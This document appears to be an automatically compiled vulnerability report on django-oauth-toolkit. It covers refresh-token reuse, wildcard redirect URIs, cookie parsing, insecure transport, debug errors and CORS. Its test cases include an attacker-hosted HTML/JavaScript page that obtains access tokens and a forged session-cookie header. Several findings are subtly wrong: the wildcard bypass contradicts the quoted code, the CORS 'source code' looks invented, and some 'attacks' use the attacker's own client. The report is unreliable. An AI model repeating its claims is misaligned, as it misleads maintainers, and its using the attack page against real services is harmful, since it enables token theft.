### Combined Vulnerability List

- **Refresh Token Reuse without Reuse Protection**

    - **Description:**
        - An attacker can reuse a refresh token to obtain new access tokens if refresh token reuse protection is not enabled.
        - Step 1: An attacker intercepts or steals a valid refresh token belonging to a legitimate user.
        - Step 2: The attacker uses the stolen refresh token to request a new access token from the token endpoint.
        - Step 3: The server, if not configured with refresh token reuse protection, grants a new access token using the same refresh token.
        - Step 4: The attacker can repeat Step 2 and Step 3 multiple times, continuously obtaining valid access tokens as long as the refresh token is valid and not expired or revoked by other means.
    - **Impact:**
        - Account takeover. An attacker with a stolen refresh token can persistently access the user's resources, even after the user's session has ended or the user has changed their password. This grants long-term unauthorized access to the protected resources.
    - **Vulnerability Rank:** High
    - **Currently Implemented Mitigations:**
        - Refresh token rotation (`ROTATE_REFRESH_TOKEN` setting): This feature, if enabled, rotates refresh tokens upon each use, reducing the window of opportunity for reuse, but it does not inherently prevent reuse of the *previous* refresh token before rotation.
        - Setting `REFRESH_TOKEN_REUSE_PROTECTION` exists: This setting, when enabled, revokes the refresh token after it's used once, effectively preventing reuse. However, it is not enabled by default.
    - **Missing Mitigations:**
        - Enable `REFRESH_TOKEN_REUSE_PROTECTION` setting by default.
        - If enabling by default is not desired, prominently recommend enabling `REFRESH_TOKEN_REUSE_PROTECTION` in the documentation, especially when `ROTATE_REFRESH_TOKEN` is also enabled, as it's a crucial security best practice.
    - **Preconditions:**
        - `ROTATE_REFRESH_TOKEN` setting is enabled (which is a recommended security practice).
        - `REFRESH_TOKEN_REUSE_PROTECTION` setting is disabled (which is the default setting).
        - An attacker must successfully obtain a valid refresh token, for example, through network interception, phishing, or malware.
    - **Source Code Analysis:**
        - (Analysis is based on project settings, documentation, existing tests and general OAuth2 flow understanding. Source code for core token handling logic is not directly present in the provided PROJECT FILES, but test files and settings files provide enough context.)
        - The vulnerability is not directly found in the provided code *files* themselves, but rather in the *default configuration* of the django-oauth-toolkit project.
        - The `settings.py` file (from PROJECT FILES) defines `REFRESH_TOKEN_REUSE_PROTECTION` in `DEFAULTS` as `False`, implying it defaults to `False` as per the library's default settings.
        - The `oauth2_provider/oauth2_validators.py` file contains `validate_refresh_token` method, which includes the logic for refresh token reuse protection:
        ```python
        if oauth2_settings.REFRESH_TOKEN_REUSE_PROTECTION and rt.token_family:
            rt_token_family = RefreshToken.objects.filter(token_family=rt.token_family)
            for related_rt in rt_token_family.all():
                related_rt.revoke()
        ```
        - This code snippet confirms that `REFRESH_TOKEN_REUSE_PROTECTION` setting controls the reuse protection behavior. When enabled, it revokes all refresh tokens in the same family upon reuse.
        - By default, without explicit configuration in a project's `settings.py`, `django-oauth-toolkit` does not enable refresh token reuse protection. This means that if `ROTATE_REFRESH_TOKEN` is enabled (which is common for security), the system will rotate refresh tokens on use, but the *old* refresh token remains valid until a *new* refresh token is used. During this window, if an attacker steals the refresh token, they can reuse it multiple times to obtain new access tokens.
        - Enabling `REFRESH_TOKEN_REUSE_PROTECTION = True` in the project's `settings.py` activates the intended mitigation, ensuring that each refresh token can be used only once. Upon successful use, the refresh token is revoked, and subsequent attempts to use the same refresh token will fail.

    - **Security Test Case:**
        - Step 1: Set up a test environment of django-oauth-toolkit. Configure `settings.py` to include:
            ```python
            OAUTH2_PROVIDER = {
                'ROTATE_REFRESH_TOKEN': True,
                'REFRESH_TOKEN_REUSE_PROTECTION': False, # Vulnerable configuration
            }
            ```
        - Step 2: Register a confidential client application.
        - Step 3: Using a test user, initiate the Authorization Code Grant flow with the registered client. Obtain an authorization code and then exchange it for an access token and a refresh token.
        - Step 4: Store the obtained refresh token (let's call it `refresh_token_original`).
        - Step 5: Use `refresh_token_original` to request a new access token from the token endpoint using a `POST` request with `grant_type=refresh_token`, `refresh_token=refresh_token_original`, `client_id` and `client_secret` for the registered client. This request should succeed, and you will receive a new access token and a new refresh token (due to rotation).
        - Step 6: Again, use the *same* `refresh_token_original` (from Step 4) to request another new access token from the token endpoint, using the same parameters as in Step 5.
        - Step 7: Verify that this second request in Step 6 is also successful and a new access token is granted. This confirms the refresh token reuse vulnerability because the original refresh token was used more than once successfully.
        - Step 8: Now, change the configuration in `settings.py` to enable reuse protection:
            ```python
            OAUTH2_PROVIDER = {
                'ROTATE_REFRESH_TOKEN': True,
                'REFRESH_TOKEN_REUSE_PROTECTION': True, # Mitigated configuration
            }
            ```
        - Step 9: Repeat Steps 2-5 to obtain a new `refresh_token_original`.
        - Step 10: Use `refresh_token_original` to request a new access token (as in Step 5). This should succeed.
        - Step 11: Replay the *same* `refresh_token_original` (from Step 9) to request another new access token (as in Step 6).
        - Step 12: Verify that this second request in Step 11 now fails. The server should return an error, such as `invalid_grant`, indicating that the refresh token has been invalidated after its first use, and reuse protection is working correctly.

- **Redirect URI Validation Bypass via Wildcard Domain**

    - **Description:**
        - If `ALLOW_URI_WILDCARDS` is enabled, a malicious client may be able to register a redirect URI with a wildcard that bypasses intended validation logic. This occurs because the wildcard validation logic in `oauth2_provider.models.redirect_to_uri_allowed` and `oauth2_provider.validators.AllowedURIValidator` might not correctly handle all edge cases, particularly when wildcards are used in conjunction with specific URI structures. The current implementation checks if wildcard is not in top level or second level domain by checking if `len(domain_parts) < 3`, which is insufficient and can be bypassed using domains like `test.*.co.uk`.
        - Step 1: An attacker registers a new OAuth2 client application or updates an existing one (if allowed) with `ALLOW_URI_WILDCARDS = True`.
        - Step 2: In the application registration form, the attacker provides a malicious redirect URI containing a wildcard, such as `https://test.*.co.uk`. The intention is to bypass validation that should prevent wildcards in top-level or second-level domains.
        - Step 3: The system's redirect URI validator, specifically `AllowedURIValidator` and the `redirect_to_uri_allowed` function, incorrectly validates this malicious wildcard redirect URI. It fails to properly enforce restrictions on wildcard placement due to insufficient check `len(domain_parts) < 3`.
        - Step 4: A legitimate user initiates an OAuth2 authorization flow with the attacker's client application.
        - Step 5: Upon successful authentication, the authorization server generates an authorization code and redirects the user to the attacker-controlled redirect URI (`https://test.attacker.co.uk`, which is considered valid by the flawed wildcard validation).
        - Step 6: The attacker intercepts the authorization code from the redirect URI and can then exchange it for an access token, potentially gaining unauthorized access to the user's resources.
    - **Impact:**
        - Authorization code interception. Successful exploitation allows an attacker to redirect users to attacker-controlled domains after successful authentication, intercepting the authorization code in the redirect URI. This can be further used to obtain access tokens and potentially lead to account takeover or data breaches.
    - **Vulnerability Rank:** High
    - **Currently Implemented Mitigations:**
        - `AllowedURIValidator` (in `oauth2_provider/validators.py`): This validator is used to check the validity of redirect URIs during application registration and authorization requests. It is designed to enforce allowed schemes and handle wildcard domains based on the `ALLOW_URI_WILDCARDS` setting.
        - The validator includes a check `if len(domain_parts) < 3:` in `AllowedURIValidator.__call__` to prevent wildcards in top-level and second-level domains when `ALLOW_HOSTNAME_WILDCARD` is enabled.
        - `redirect_to_uri_allowed` function (in `oauth2_provider/models.py`): This function uses `AllowedURIValidator` to check if a given URI is within the allowed redirect URIs for a client application. It includes logic for wildcard hostname matching.
    - **Missing Mitigations:**
        - More robust and comprehensive wildcard validation logic within `AllowedURIValidator` and `redirect_to_uri_allowed`. The current check `if len(domain_parts) < 3:` in `AllowedURIValidator.__call__` is not sufficient to prevent wildcard bypasses in domains like `test.*.co.uk`. This should include stricter rules to prevent wildcards in top-level and second-level domains and to handle various edge cases in wildcard pattern matching to avoid bypasses.
        - Implement more specific and restrictive regular expressions or dedicated parsing logic for wildcard domain validation to ensure that only intended wildcard patterns are permitted and malicious patterns are rejected. For example, ensure that wildcard `*` is only allowed as the leftmost part of the hostname and is followed by at least a second level domain and a top level domain.
    - **Preconditions:**
        - `ALLOW_URI_WILDCARDS` setting must be enabled in the django-oauth-toolkit configuration.
        - Application registration functionality must be enabled and accessible to potential attackers, or there must be a way for attackers to modify existing application configurations.
        - A vulnerable wildcard redirect URI pattern, such as `https://test.*.co.uk`, must be used that bypasses the current validation logic.
    - **Source Code Analysis:**
        - Analyze `oauth2_provider/validators.py` - `AllowedURIValidator.__call__` function:
        ```python
        class AllowedURIValidator(URIValidator):
            # ...
            def __call__(self, value):
                # ...
                if self.allow_hostname_wildcard and "*" in netloc:
                    domain_parts = netloc.split(".")
                    if netloc.count("*") > 1:
                        # ...
                    if not netloc.startswith("*"):
                        # ...
                    if len(domain_parts) < 3: # Insecure check
                        # ...
                    # ...
        ```
        - The wildcard validation logic in `AllowedURIValidator.__call__` checks for the number of domain parts using `len(domain_parts) < 3`.
        - Vulnerability: The condition `len(domain_parts) < 3` is insufficient to prevent wildcard bypasses. It incorrectly allows wildcards in domains with more than 2 parts, such as `test.*.co.uk`, where `domain_parts` would be `['test', '*', 'co', 'uk']` and `len(domain_parts)` is 4, which is not less than 3, thus bypassing the intended restriction. This allows attackers to register redirect URIs with wildcards in effectively third-level domains and beyond, leading to potential redirect URI bypass.
        - Analyze `oauth2_provider/models.py` - `redirect_to_uri_allowed` function:
        - This function uses `AllowedURIValidator` to perform the actual validation, thus inheriting the flawed wildcard validation logic.
    - **Security Test Case:**
        - Step 1: Set up a test environment of django-oauth-toolkit with `ALLOW_URI_WILDCARDS = True` in `settings.py`.
        - Step 2: Log in as a superuser or a user who can register OAuth2 applications (if registration is enabled).
        - Step 3: Attempt to register a new confidential client application with the following redirect URI: `https://test.*.co.uk`. Fill in other required fields for application registration (name, client type, grant type, etc.).
        - Step 4: Submit the application registration form.
        - Step 5: Check the response.
            - Expected behavior (secure): The application registration should fail with a validation error, indicating that the redirect URI is invalid due to the wildcard in the third-level domain.
            - Vulnerable behavior: The application registration succeeds, and the malicious redirect URI is accepted.
        - Step 6: If the application registration is successful (vulnerable behavior), initiate an Authorization Code Grant flow with this newly registered application. Use a valid user account and authorize the application.
        - Step 7: Observe the redirect URI after authorization. If the redirect goes to a URI like `https://test.attacker.co.uk/?code=...`, it confirms the wildcard bypass because `attacker.co.uk` was not intended to be a valid redirect URI for `https://test.*.co.uk`.
        - Step 8: Attempt to exchange the intercepted authorization code for an access token. If successful, it further confirms the vulnerability, as an attacker can now obtain access tokens using a bypassed redirect URI.

- **Improper Cookie Parsing in Silent Login Validator**

    - **Description:**
        - The custom OAuth2 validator’s method for silent login (in `/code/tests/app/idp/idp/oauth.py`) extracts the session cookie directly from the raw `HTTP_COOKIE` header by doing a simple split on “; ” and then splitting again on “=”. Instead of using Django’s trusted cookie parser (e.g. `request.COOKIES`), it uses a naïve “startswith” check that will match cookie names with accidental or malicious prefixes. An attacker who can control the raw HTTP headers can send a cookie with a name that begins with the expected session cookie name (for example, “sessionid_malicious=attackervalue”), causing the parsing loop to break early and use the attacker‑supplied value. When the application calls Django’s `SessionStore` using that manipulated value, it may load an attacker‑controlled session, thereby bypassing authentication.
        - _Step‑by-step trigger:_
        - 1. Deploy the IDP application using test settings so that the custom OAuth2 validator’s `validate_silent_login` is active.
        - 2. Craft an HTTP request to a protected OAuth endpoint and set the `HTTP_COOKIE` header to include a cookie named with a prefix matching (but not equal to) the legitimate session cookie (for example, `sessionid_malicious=attackervalue`).
        - 3. Because the validator checks cookie names with a “startswith” routine instead of an exact match, it selects the malicious cookie value.
        - 4. Django’s session middleware loads the session based on the attacker‑supplied session ID, and the authentication check is bypassed.
    - **Impact:**
        - An attacker can perform session fixation or session hijacking, misleading the application into treating the supplied session as valid and granting access to session‑protected functionality.
    - **Vulnerability Rank:** High
    - **Currently Implemented Mitigations:**
        - The logic is implemented “as‑is” in the test configuration and uses a naïve string split without any further runtime checks or use of the secure Django cookie parser.
    - **Missing Mitigations:**
        - • Use Django’s built‑in cookie parser (via `request.COOKIES`) rather than manually parsing `HTTP_COOKIE`.
        - • Verify that the cookie name exactly equals the configured session cookie name rather than checking with “startswith”.
        - • Gracefully handle missing or malformatted cookies.
    - **Preconditions:**
        - • The IDP application is deployed using test/development settings with the custom OAuth2 validator active.
        - • The attacker can send arbitrary HTTP headers (and therefore control the cookie header).
    - **Source Code Analysis:**
        - • In `/code/tests/app/idp/idp/oauth.py`, the method `validate_silent_login` retrieves the raw string from `request.headers.get("HTTP_COOKIE")`.
        - • The code splits the cookie string using `split("; ")` and iterates over the resulting tokens.
        - • For each token, it performs a `cookie.split("=")` and then checks if the token starts with the session cookie name (using a “startswith” check).
        - • Because the check uses “startswith”, a cookie named, for example, `sessionid_malicious` will be accepted.
        - • Finally, the code calls `SessionStore` with the attacker‑supplied cookie value, resulting in a bypass of authentication controls.
    - **Security Test Case:**
        - 1. Deploy the IDP instance with the test configuration (ensuring the silent login validator is active).
        - 2. Use a tool (such as curl or Postman) to send an HTTP request to a protected OAuth endpoint with a header, for example:
           ```
           HTTP_COOKIE: sessionid_malicious=attackercontrolledvalue; othercookie=foo
           ```
        - 3. Verify that the application accepts the malicious cookie value and that the response indicates an authenticated session (for example, by accessing protected content).
        - 4. A successful bypass confirms the vulnerability.

- **Insecure Use of OAuthLIB_INSECURE_TRANSPORT Setting**

    - **Description:**
        - In the IDP settings file (`/code/tests/app/idp/idp/settings.py`), the environment variable `OAUTHLIB_INSECURE_TRANSPORT` is assigned a default value of `"1"`, which is interpreted as truthy. This forces OAuthlib to allow non‑HTTPS (insecure HTTP) connections even when the application is deployed publicly. An attacker on the same network can intercept OAuth flows and view or tamper with transmitted tokens and credentials.
        - _Step‑by-step trigger:_
        - 1. Deploy the IDP application with test settings still in place (keeping `OAUTHLIB_INSECURE_TRANSPORT` enabled).
        - 2. Initiate an OAuth flow (e.g. request an authorization code or access token) using HTTP instead of HTTPS.
        - 3. Use a network interception tool (like Wireshark or mitmproxy) to capture the network traffic.
        - 4. Extract sensitive OAuth tokens or credentials from the cleartext HTTP communications.
    - **Impact:**
        - Allowing OAuth flows over HTTP makes the communications vulnerable to man‑in‑the‑middle attacks. An attacker intercepting the traffic could capture tokens and client credentials to impersonate legitimate users or clients.
    - **Vulnerability Rank:** High
    - **Currently Implemented Mitigations:**
        - The insecure transport setting is documented as test‑only and is enabled by default in the test configuration. However, there is no runtime safeguard preventing its use in a publicly accessible deployment.
    - **Missing Mitigations:**
        - • Production deployments should override this setting (or remove it altogether) so that OAuthlib enforces HTTPS.
        - • Restrict network access to OAuth endpoints so that they are only reachable over TLS‑protected channels.
    - **Preconditions:**
        - • The IDP application is publicly deployed using a test configuration in which `OAUTHLIB_INSECURE_TRANSPORT` is set to `"1"`.
        - • HTTP (rather than HTTPS) is used to communicate with the OAuth endpoints.
    - **Source Code Analysis:**
        - • In `/code/tests/app/idp/idp/settings.py`, the setting is established as:
          ```python
          OAUTHLIB_INSECURE_TRANSPORT = (bool, "1")
          ```
        - • Later in the settings, the code assigns:
          ```python
          os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = env("OAUTHLIB_INSECURE_TRANSPORT")
          ```
        - • This ensures that OAuthlib’s HTTPS requirement is effectively disabled.
    - **Security Test Case:**
        - 1. Deploy the IDP instance with the test configuration (with `OAUTHLIB_INSECURE_TRANSPORT` left at its default value of `"1"`).
        - 2. Initiate an OAuth flow using HTTP (not HTTPS).
        - 3. On the same network, run a packet‑sniffing tool (such as Wireshark) to capture the OAuth-related HTTP traffic.
        - 4. Verify that OAuth tokens and client credentials are transmitted in cleartext.
        - 5. Successful interception of sensitive data confirms the vulnerability.

- **Insecure Error Handling in OIDC Mixins under DEBUG Mode**

    - **Description:**
        - The mixins used for OpenID Connect endpoints—the `OIDCOnlyMixin` and the `OIDCLogoutOnlyMixin` (in `/code/oauth2_provider/views/mixins.py`)—are designed to restrict access when OIDC or OIDC RP‑Initiated Logout is disabled. In both mixins, if the corresponding OIDC setting is not enabled and Django’s `DEBUG` setting is True, the mixin raises an `ImproperlyConfigured` exception with a detailed error message. This behavior is intended for development only. However, if test or development settings (with `DEBUG=True`) are mistakenly deployed to production, an external attacker can trigger these endpoints to receive verbose exception details outlining internal configuration and operational logic.
        - _Step‑by-step trigger:_
        - 1. Deploy the application in a public environment using a configuration where `DEBUG=True` and OIDC (or OIDC RP‑Initiated Logout) is disabled (i.e. `oauth2_settings.OIDC_ENABLED` or `oauth2_settings.OIDC_RP_INITIATED_LOGOUT_ENABLED` is False).
        - 2. Send an HTTP request (such as a GET request) to an endpoint that utilizes either `OIDCOnlyMixin` or `OIDCLogoutOnlyMixin`.
        - 3. The mixin’s `dispatch` method checks the corresponding OIDC setting. When it finds that OIDC is not enabled, it then examines the value of `settings.DEBUG`.
        - 4. Since `DEBUG` is True, the mixin raises an `ImproperlyConfigured` exception that contains a detailed error message (and possibly a stack trace) highlighting configuration details.
    - **Impact:**
        - The detailed error messages and stack traces disclosed in the response allow an attacker to gather internal configuration details, including which OIDC features are (or are not) enabled. This information may aid in mapping out the internal workings of the application and facilitate further attacks.
    - **Vulnerability Rank:** High
    - **Currently Implemented Mitigations:**
        - The code itself attempts to avoid misdirection by defaulting to a generic 404 response when `DEBUG` is False. However, when `DEBUG` is True—a setting meant only for development—the detailed exception is raised without any further sanitization.
    - **Missing Mitigations:**
        - • Ensure that production deployments never use `DEBUG=True`.
        - • Even when in development mode, consider providing a generic error message (or logging detailed errors server‑side only) rather than returning detailed exception information in responses.
        - • Add a safeguard (or use middleware) that prevents detailed configuration errors from being sent in HTTP responses regardless of the DEBUG setting.
    - **Preconditions:**
        - • The application is publicly deployed using a test or development configuration where `DEBUG=True`.
        - • The OIDC (or OIDC RP‑Initiated Logout) setting is disabled, causing the mixins to trigger the error-handling code path.
        - • An attacker is able to access endpoints that use the affected mixins.
    - **Source Code Analysis:**
        - • In `OIDCOnlyMixin.dispatch`, the code checks if `oauth2_settings.OIDC_ENABLED` is False.
        - • If it is not enabled and `settings.DEBUG` is True, the method raises:
          ```python
          raise ImproperlyConfigured(self.debug_error_message)
          ```
        - • Similarly, `OIDCLogoutOnlyMixin.dispatch` checks `oauth2_settings.OIDC_RP_INITIATED_LOGOUT_ENABLED` and raises an exception with a detailed debug message when the setting is not enabled and DEBUG is True.
        - • These exceptions may reveal internal configuration details and hints about the system’s architecture.
    - **Security Test Case:**
        - 1. Deploy the application with a configuration that (mistakenly) sets `DEBUG=True` and disables OIDC (or OIDC RP‑Initiated Logout).
        - 2. Identify an endpoint that incorporates either `OIDCOnlyMixin` or `OIDCLogoutOnlyMixin`.
        - 3. Use a tool like curl or a web browser to issue an HTTP request to that endpoint.
        - 4. Observe that the response is not a generic HTTP 404 but a detailed error message (and possibly a stack trace) that includes internal configuration details.
        - 5. The presence of detailed error messages confirms that the vulnerability is present.

- **Permissive CORS Policy due to Wildcard Allowed Origins**

    - **Description:**
        - An OAuth2 application can be configured with a wildcard (`*`) in the `allowed_origins` field.
        - When a request is made to the token endpoint with an `Origin` header that matches the `allowed_origins` (including wildcard), the server responds with an `Access-Control-Allow-Origin` header set to the request's origin or the wildcard.
        - If `allowed_origins` is set to a wildcard (`*`), this effectively disables CORS protection, allowing any website to make cross-origin requests and potentially obtain access tokens.
        - Step-by-step trigger:
            1. Create an OAuth2 application and set `allowed_origins` to `*`.
            2. From a malicious website (e.g., `http://malicious.attacker.com`), initiate an OAuth2 authorization code flow targeting the vulnerable OAuth2 provider.
            3. After the user authorizes the application, the malicious website receives an authorization code.
            4. The malicious website sends a POST request to the token endpoint (`/o/token/`) with the received authorization code, client credentials, and `Origin: http://malicious.attacker.com` header.
            5. The server responds with `Access-Control-Allow-Origin: *` or `Access-Control-Allow-Origin: http://malicious.attacker.com` header, along with the access token.
            6. The malicious website can now access the access token and use it to access protected resources on behalf of the user.
    - **Impact:**
        - **Account Takeover Risk**: If an attacker successfully obtains an access token, they can impersonate the legitimate user and access their protected resources, potentially leading to data theft, unauthorized actions, and complete account takeover.
        - **Data Breach**:  Access tokens can grant broad permissions depending on the scopes requested. A successful exploit can lead to a significant breach of user data accessible through the OAuth2 API.
    - **Vulnerability Rank:** High
    - **Currently Implemented Mitigations:**
        - CORS is implemented and controlled by the `allowed_origins` field on the `Application` model.
        - The code checks the `Origin` header against the `allowed_origins` list in `OAuthLibCore.verify_request()` (`oauth2_provider/oauth2_backends.py`).
        - Tests in `test_token_endpoint_cors.py` verify basic CORS functionality based on `allowed_origins`.
    - **Missing Mitigations:**
        - **Input Validation for `allowed_origins`**: There is no validation on the format or content of the `allowed_origins` field. It allows wildcard `*` without any warnings or specific documentation discouraging its use in production.
        - **Guidance against Wildcard Origins**: Documentation and best practices should explicitly warn against using wildcard (`*`) in `allowed_origins` in production environments.
        - **Default Secure Configuration**:  The default behavior should be more secure, perhaps by disallowing wildcard origins unless explicitly enabled via a setting with a clear security warning.
    - **Preconditions:**
        - An OAuth2 Application is configured with `allowed_origins = '*'`.
        - The application uses a grant type that involves token endpoint interaction from the client-side (e.g., authorization code grant with a client-side application).
        - CORS is enabled (implicitly enabled when `allowed_origins` is set).
    - **Source Code Analysis:**
        - `oauth2_provider/views/mixins.py`: `OAuthLibMixin.get_oauthlib_core()` is responsible for creating `OAuthLibCore` instance.
        - `oauth2_provider/oauth2_backends.py`: `OAuthLibCore.verify_request()` method checks for `Origin` header and `application.allowed_origins`.
        ```python
        # File: /code/oauth2_provider/oauth2_backends.py
        # Visualization: Control flow for CORS check in OAuthLibCore.verify_request()

        # ... (code before) ...

        def verify_request(self, uri, http_method='GET', body=None, headers=None, scopes=None, client_id=None,
                           client_secret=None, assertion=None, username=None, password=None, code=None,
                           redirect_uri=None, refresh_token=None, request_type=''):
            # ... (other checks) ...

            if request_type in ['access_token', 'refresh_token']: # Token endpoint requests
                origin = headers.get('Origin')
                if origin:
                    allowed_origins = self.application.allowed_origins.split() if self.application.allowed_origins else []
                    if "*" in allowed_origins or origin in allowed_origins: # Vulnerability: Wildcard check
                        self.response_headers['Access-Control-Allow-Origin'] = origin if origin not in ["*"] else "*" # Sets ACAO header, wildcard is allowed
                        self.response_headers['Access-Control-Allow-Credentials'] = 'true'
            # ... (code after) ...
        ```
        - The code directly checks for wildcard `"*"` in `allowed_origins` and sets `Access-Control-Allow-Origin: *` if found, leading to the vulnerability.
    - **Security Test Case:**
        - 1. **Setup:**
            - Create a new OAuth2 Application in the Django Admin panel.
            - Set `Name`: "Malicious App CORS Test"
            - Set `Client type`: Confidential
            - Set `Authorization grant type`: Authorization code
            - Set `Allowed origins`: `*`
            - Save the application and note the `Client ID` and `Client secret`.
            - Ensure `PKCE_REQUIRED` setting is `False` for simplicity.
        - 2. **Attacker's Malicious Website:**
            - Create a simple HTML file (e.g., `malicious.html`) hosted on `http://malicious.attacker.com`.
            - Include JavaScript code to perform the OAuth2 authorization code flow and token exchange.
            ```html
            <!DOCTYPE html>
            <html>
            <head>
                <title>Malicious Website</title>
            </head>
            <body>
                <h1>Malicious Website</h1>
                <button id="authButton">Get Access Token</button>
                <div id="output"></div>

                <script>
                    const authButton = document.getElementById('authButton');
                    const outputDiv = document.getElementById('output');
                    const clientId = 'YOUR_CLIENT_ID'; // Replace with Client ID from step 1
                    const redirectUri = 'http://malicious.attacker.com/malicious.html';
                    const authorizationEndpoint = 'http://localhost:8000/o/authorize/'; // Replace with your authorization endpoint
                    const tokenEndpoint = 'http://localhost:8000/o/token/'; // Replace with your token endpoint

                    authButton.addEventListener('click', () => {
                        const authorizationUrl = `${authorizationEndpoint}?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=read`;
                        window.location.href = authorizationUrl;
                    });

                    const urlParams = new URLSearchParams(window.location.search);
                    const authorizationCode = urlParams.get('code');

                    if (authorizationCode) {
                        fetch(tokenEndpoint, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Origin': 'http://malicious.attacker.com' // Set malicious origin
                            },
                            body: new URLSearchParams({
                                'grant_type': 'authorization_code',
                                'code': authorizationCode,
                                'redirect_uri': redirectUri,
                                'client_id': clientId,
                                'client_secret': 'YOUR_CLIENT_SECRET' // Replace with Client Secret from step 1
                            })
                        })
                        .then(response => response.json())
                        .then(data => {
                            outputDiv.innerHTML = `<p>Access Token: ${data.access_token}</p>`;
                            // In a real attack, the attacker would exfiltrate the access_token
                            console.log('Access Token:', data.access_token);
                        })
                        .catch(error => {
                            outputDiv.innerHTML = `<p>Error: ${error.message}</p>`;
                        });
                    }
                </script>
            </body>
            </html>
            ```
            - **Replace placeholders**: In the `malicious.html` file, replace `YOUR_CLIENT_ID` and `YOUR_CLIENT_SECRET` with the Client ID and Client secret of the application created in step 1. Update `authorizationEndpoint` and `tokenEndpoint` if your endpoints are different.
        - 3. **Victim Interaction:**
            - Host the `malicious.html` file on a server accessible as `http://malicious.attacker.com/malicious.html`.
            - Send the link `http://malicious.attacker.com/malicious.html` to a victim user.
            - The victim user clicks the "Get Access Token" button on the malicious website and authorizes the OAuth2 application on the provider's site (e.g., `http://localhost:8000`).
        - 4. **Verification:**
            - After authorization, the victim is redirected back to `http://malicious.attacker.com/malicious.html`.
            - Observe the "Access Token: ..." displayed on the malicious website.
            - Check the browser's developer console (Console tab) for `Access Token: ...` output, confirming the access token was successfully retrieved by the malicious website due to the wildcard CORS configuration.
